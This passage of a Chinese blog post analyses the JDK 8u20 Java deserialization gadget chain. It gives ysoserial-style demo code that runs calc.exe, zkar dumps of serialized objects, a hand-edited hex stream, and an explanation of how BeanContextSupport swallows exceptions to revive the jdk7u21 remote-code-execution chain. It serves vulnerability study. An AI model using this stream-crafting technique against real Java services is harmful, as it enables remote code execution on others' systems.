class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">42</span> <span class="hljs-number">65</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">43</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">78</span> <span class="hljs-number">74</span> <span class="hljs-number">53</span> <span class="hljs-number">75</span> <span class="hljs-number">70</span> <span class="hljs-number">70</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">74</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">20</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.BeanContextSupport<br>        &#123;&#125;Attributes<br><br></code></pre></td></tr></table></figure><p>然后序列化<code>AnnotationInvocationHandler</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.jdk8u20;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        payload();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        AnnotationInvocationHandler handler=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationInvocationHandler</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;test2&quot;</span>));<br>        out.writeObject(handler);<br>        out.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;test2&quot;</span>));<br>        AnnotationInvocationHandler str=(AnnotationInvocationHandler)in.readObject();<br>        str.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>zkar查看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">PS D:\Code_Project\Go\zkar-master&gt; go run main.go dump -f <span class="hljs-string">&quot;D:\Code_Project\Java\ysoserial-master\test2&quot;</span><br><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">45</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">2d</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.AnnotationInvocationHandler - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">41</span> 6e 6e <span class="hljs-number">6f</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">49</span> 6e <span class="hljs-number">76</span> <span class="hljs-number">6f</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">48</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0a<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span><br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-meta">@Value</span> - zero - <span class="hljs-number">0x7a</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure><p>然后再利用<code>objectAnnotation</code>插入<code>AnnotationInvocationHandler</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Magic</span> - <span class="hljs-number">0xac</span> ed<br><span class="hljs-meta">@Version</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br><span class="hljs-meta">@Contents</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">36</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">24</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.BeanContextSupport - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">42</span> <span class="hljs-number">65</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">43</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">78</span> <span class="hljs-number">74</span> <span class="hljs-number">53</span> <span class="hljs-number">75</span> <span class="hljs-number">70</span> <span class="hljs-number">70</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">74</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">20</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">14</span><br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257536</span>  <br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE|SC_WRITE_METHOD - <span class="hljs-number">0x03</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span><br>      []Fields<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span><br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.BeanContextSupport<br>        &#123;&#125;Attributes<br><span class="hljs-meta">@ObjectAnnotation</span><br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      <span class="hljs-meta">@ClassName</span><br>        <span class="hljs-meta">@Length</span> - <span class="hljs-number">45</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">2d</span><br>        <span class="hljs-meta">@Value</span> - ysoserial.jdk8u20.AnnotationInvocationHandler - <span class="hljs-number">0x79</span> <span class="hljs-number">73</span> <span class="hljs-number">6f</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">61</span> 6c 2e 6a <span class="hljs-number">64</span> 6b <span class="hljs-number">38</span> <span class="hljs-number">75</span> <span class="hljs-number">32</span> <span class="hljs-number">30</span> 2e <span class="hljs-number">41</span> 6e 6e <span class="hljs-number">6f</span> <span class="hljs-number">74</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">49</span> 6e <span class="hljs-number">76</span> <span class="hljs-number">6f</span> <span class="hljs-number">63</span> <span class="hljs-number">61</span> <span class="hljs-number">74</span> <span class="hljs-number">69</span> <span class="hljs-number">6f</span> 6e <span class="hljs-number">48</span> <span class="hljs-number">61</span> 6e <span class="hljs-number">64</span> 6c <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      <span class="hljs-meta">@SerialVersionUID</span> - <span class="hljs-number">10</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 0a<br>      <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257538</span> <br>      <span class="hljs-meta">@ClassDescFlags</span> - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      <span class="hljs-meta">@FieldCount</span> - <span class="hljs-number">1</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">01</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Integer - I - <span class="hljs-number">0x49</span><br>          <span class="hljs-meta">@FieldName</span><br>            <span class="hljs-meta">@Length</span> - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            <span class="hljs-meta">@Value</span> - zero - <span class="hljs-number">0x7a</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">6f</span><br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      <span class="hljs-meta">@SuperClassDesc</span><br>        TC_NULL - <span class="hljs-number">0x70</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257539</span>  <br>    []ClassData<br>      <span class="hljs-meta">@ClassName</span> - ysoserial.jdk8u20.AnnotationInvocationHandler<br>        &#123;&#125;Attributes<br>          <span class="hljs-title function_">zero</span><br>            <span class="hljs-params">(integer)</span><span class="hljs-number">0</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>  TC_REFERENCE - <span class="hljs-number">0x71</span><br>    <span class="hljs-meta">@Handler</span> - <span class="hljs-number">8257537</span> <br></code></pre></td></tr></table></figure><p>因为@Handler时自动生成的，所以我们构造数据的时候要丢弃newhandle对应的十六进制数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aced</span> <span class="hljs-number">0005</span> <span class="hljs-number">7372</span> <span class="hljs-number">0024</span> <span class="hljs-number">7973</span> <span class="hljs-number">6</span>f73 <span class="hljs-number">6572</span> <span class="hljs-number">6961</span> <br><span class="hljs-attribute">6c2e</span> <span class="hljs-number">6</span>a64 <span class="hljs-number">6</span>b38 <span class="hljs-number">7532</span> <span class="hljs-number">302</span>e <span class="hljs-number">4265</span> <span class="hljs-number">616</span>e <span class="hljs-number">436</span>f <br><span class="hljs-attribute">6e74</span> <span class="hljs-number">6578</span> <span class="hljs-number">7453</span> <span class="hljs-number">7570</span> <span class="hljs-number">706</span>f <span class="hljs-number">7274</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <br><span class="hljs-attribute">0000</span> <span class="hljs-number">0014</span> <span class="hljs-number">0300</span> <span class="hljs-number">0078</span> <span class="hljs-number">7073</span> <span class="hljs-number">7200</span> <span class="hljs-number">2</span>d79 <span class="hljs-number">736</span>f <br><span class="hljs-attribute">7365</span> <span class="hljs-number">7269</span> <span class="hljs-number">616</span>c <span class="hljs-number">2</span>e6a <span class="hljs-number">646</span>b <span class="hljs-number">3875</span> <span class="hljs-number">3230</span> <span class="hljs-number">2</span>e41 <br><span class="hljs-attribute">6e6e</span> <span class="hljs-number">6</span>f74 <span class="hljs-number">6174</span> <span class="hljs-number">696</span>f <span class="hljs-number">6</span>e49 <span class="hljs-number">6</span>e76 <span class="hljs-number">6</span>f63 <span class="hljs-number">6174</span> <br><span class="hljs-attribute">696f</span> <span class="hljs-number">6</span>e48 <span class="hljs-number">616</span>e <span class="hljs-number">646</span>c <span class="hljs-number">6572</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <span class="hljs-number">0000</span> <br><span class="hljs-attribute">000a</span> <span class="hljs-number">0200</span> <span class="hljs-number">0149</span> <span class="hljs-number">0004</span> <span class="hljs-number">7</span>a65 <span class="hljs-number">726</span>f <span class="hljs-number">7870</span> <span class="hljs-number">0000</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">7871</span><br></code></pre></td></tr></table></figure><h2 id="实际分析"><a href="#实际分析" class="headerlink" title="实际分析"></a>实际分析</h2><p>我们在<code>jdk8u20漏洞原理</code>部分提到<code>逃过异常抛出</code>是该漏洞的关键所在，又经过上面一个case的分析，现在再来看看如何逃过异常抛出呢？没错，就是在<code>jdk</code>源码中找到一个类似于该<code>case</code>中的<code>BeanContextSupport</code>类，让<code>BeanContextSupport</code>成为外层，去调用<code>jdk</code>源码中的<code>AnnotationInvocationHandler</code>类，这样一来没有异常抛出就能够使反序列化流程不被终止，成功组成新的gadget链，完成一次完美的反序列化漏洞攻击。</p><p>那么在<code>jdk</code>源码中到底有没有一个类似于该<code>case</code>中的<code>BeanContextSupport</code>类？答案是显而易见的，其实为了方便读者理解此处的内容，我在case中就把这个类的名称给了出来——是的，就是<code> java.beans.beancontext.BeanContextSuppor</code>类，我们利用的是该类中的<code>readChildren</code>方法，来具体看看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readChildren</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> serializable;<br>       <span class="hljs-keyword">while</span> (count-- &gt; <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-type">Object</span>                      <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           BeanContextSupport.<span class="hljs-type">BCSChild</span> <span class="hljs-variable">bscc</span>  <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>           <span class="hljs-keyword">try</span> &#123;<br>               child = ois.readObject();<br>               bscc  = (BeanContextSupport.BCSChild)ois.readObject();<br>           &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>               <span class="hljs-keyword">continue</span>;<br>           &#125;<br>           <span class="hljs-keyword">synchronized</span>(child) &#123;<br>               <span class="hljs-type">BeanContextChild</span> <span class="hljs-variable">bcc</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   bcc = (BeanContextChild)child;<br>               &#125; <span class="hljs-keyword">catch</span> (ClassCastException cce) &#123;<br>                   <span class="hljs-comment">// do nothing;</span><br>               &#125;<br>               <span class="hljs-keyword">if</span> (bcc != <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-keyword">try</span> &#123;<br>                       bcc.setBeanContext(getBeanContextPeer());<br><br>                      bcc.addPropertyChangeListener(<span class="hljs-string">&quot;beanContext&quot;</span>, childPCL);<br>                      bcc.addVetoableChangeListener(<span class="hljs-string">&quot;beanContext&quot;</span>, childVCL);<br><br>                   &#125; <span class="hljs-keyword">catch</span> (PropertyVetoException pve) &#123;<br>                       <span class="hljs-keyword">continue</span>;<br>                   &#125;<br>               &#125;<br>               childDeserializedHook(child, bscc);<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>可以看到，在该方法的第7行，对传入进来的<code>ObjectInputStream</code>对象调用了<code>readObject</code>方法进行反序列化处理，并且当在反序列化过程中如果出现异常，采用的是<code>continue</code>处理。完美的符合我们的要求。</p><p>我们在上文中提到<code>ObjectAnnotation</code>这个概念，并且其实可以发现，如果存在<code>ObjectAnnotation</code>结构，那么一般是由<code>TC_ENDBLOCKDATA - 0x78</code>去标记结尾的，但是这里其实存在一个问题，我们知道在jdk7u21修复中是因为<code>IllegalArgumentException</code>异常被捕获后抛出了<code>java.io.InvalidObjectException</code>，虽然这里我们可以利用<code>BeanContextSupport</code>来强制序列化流程继续下去，但是抛出的异常会导致<code>BeanContextSupport</code>的<code>ObjectAnnotation</code>中<code>TC_ENDBLOCKDATA - 0x78</code>结尾标志无法被正常处理，如果我们不手动删除这个<code>TC_ENDBLOCKDATA - 0x78</code>那么会导致后面的结构归在<code>ObjectAnnotation</code>结构中，从而读取错误，反序列化出来的数据不是我们预期数据。所以我们在生成<code>BeanContextSupport</code>的<code>ObjectAnnotation</code>中不能按照正规的序列化结构，需要将标记结尾的结构<code>TC_ENDBLOCKDATA - 0x78</code>删除</p><p>也正由于我们把<code>TC_ENDBLOCKDATA - 0x78</code>删除了，会导致我们在使用<code>SerializationDumper</code>工具查看<code>jdk8u20</code>的序列化数据结构出错，如下图所示：</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230415223523459.png" alt="image-20230415223523459"> </p><p>这里还有一个tips点，就是我们在插入<code>BeanContextSupport</code>对象的时候并不是像case中那样直接插入，而是借用假属性的概念插入。在<code>成员抛弃</code>中我们提到</p><blockquote><p>在反序列化中，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值，<strong>如果这个值出现在字节流中，但是并不属于对象，则抛弃该值，但是如果这个值是一个对象的话，那么会为这个值分配一个 Handle。</strong></p></blockquote><p>所以我们插入一个任意类型为<code>BeanContextSupport</code>的字段就可以在不影响原有的序列化流程的情况下，形成一个gadget链</p><p>这里可能有点难以理解，多说一点</p><p>我们知道一般gadget链是一链接着一链紧紧相连，通过写各种类之间的调用，就能够满足整个gadget链的要求，实现整个gadget链的相连。但在jdk8u20中，并非如此，因为<code>LinkedHashSet</code>没法在<strong>满足绕过异常抛出的条件下</strong>直接调用<code>BeanContextSupport</code>方法，但是<code>BeanContextSupport</code>可以调用<code>AnnotationInvocationHandler</code>方法，这也就导致我们的gadget链在<code>LinkedHashSet</code>下一步断了，那怎么办？</p><p>只能通过修改序列化数据结构的方式，在<code>LinkedHashSet</code>中强行插入一个<code>BeanContextSupport</code>类型的字段值，由于在java反序列化的流程中，一般都是首先还原对象中字段的值，然后才会还原<code>objectAnnotation</code>结构中的值（即是按照序列化数据结构的顺序），所以它会首先反序列化<code>LinkedHashSet</code>，然后反序列<code>LinkedHashSet</code>字段的值，由于在这个字段值中有一个<code>BeanContextSupport</code>类型的字段，所以反序列化会去还原<code>BeanContextSupport</code>对象，也就是<code>objectAnnotation</code>中的数据</p><p>在反序列化<code>BeanContextSupport</code>的过程中，会首先反序列化<code>BeanContextSupport</code>的字段值，其中有个值为<code> Templates.class</code> 的 <code>AnnotationInvocationHandler</code> 类的对象的字段，然后反序列化会去还原<code>AnnotationInvocationHandler</code>对象，成功的关联了下一个链！</p><p>最后就是同<code>Jdk7u21</code>一样的流程，利用动态代理触发<code>Proxy.equals(EvilTemplates.class)</code>，达到恶意类注入实现RCE的最终目的</p><p>先看修复过后的<code>AnnotationInvocationHandler</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream var1)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    var1.defaultReadObject();<br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var2 = AnnotationType.getInstance(<span class="hljs-built_in">this</span>.type);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException var9) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br><span class="hljs-comment">// ...</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>JDK7u21的利用链如下，分别反序列化两个类，然后在put的方法中触发proxy的invoke</p><p>JDK8u20这条链的思路是增加一个不存在的field字段，这个字段中是一个序列化类，它包裹住<code>AnnotationInvocationHandler</code>，catch住<code>AnnotationInvocationHandler</code>反序列化过程中的异常，并且在后续的反序列化中不报错，它会被正常反序列化。然后在需要<code>AnnotationInvocationHandler</code>的时候，替换为之前field反序列化中生成的<code>AnnotationInvocationHandler</code>的<code>reference</code>。</p><p>这个field字段可以加在两个地方，一个是HashSet的field字段，另一个是hashSet的成员的field。</p><p>利用链如下</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414222627594.png" alt="image-20230414222627594"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230414222652854.png" alt="image-20230414222652854"> </p><p>如果把<code>AnnotationInvocationHandler#readObject</code>当成内层try catch嵌套在外层<code>try catch</code>中，反序列化的时候会在内存中留下完整的<code>AnnotationInvocationHandler</code>和对应的handler。而此后在真正需要用到<code>AnnotationInvocationHandler</code>的时候，<code>ObjectInputStream</code>会直接引用这个<code>handler</code>。</p><p>也就是说，如果你把<code>readObject</code>方法放在一个嵌套的try-catch块中，而且在反序列化过程中发生了异常，那么内层的catch块会处理异常，但是外层的try块会继续执行。这意味着<code>AnnotationInvocationHandler</code>对象和它的handler（一个从属性到值的映射）会留在内存中，即使它们没有完全初始化或验证。后来，当<code>AnnotationInvocationHandler</code>对象被另一个类（比如<code>ObjectInputStream</code>）使用时，它会直接引用<code>handler</code>映射，而不检查它的内容。这可能导致任意代码执行，如果<code>handler</code>映射包含了恶意的值</p><p>所以需要找到一个<code>readObject</code>流程里有<code>try catch</code>且不影响反序列化流程的类。</p><p>如<code>java.beans.beancontext.BeanContextSupport</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">#BeanContextSupport#readObject<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>    <span class="hljs-keyword">synchronized</span>(BeanContext.globalHierarchyLock) &#123;<br>        ois.defaultReadObject();<br><br>        initialize();<br><br>        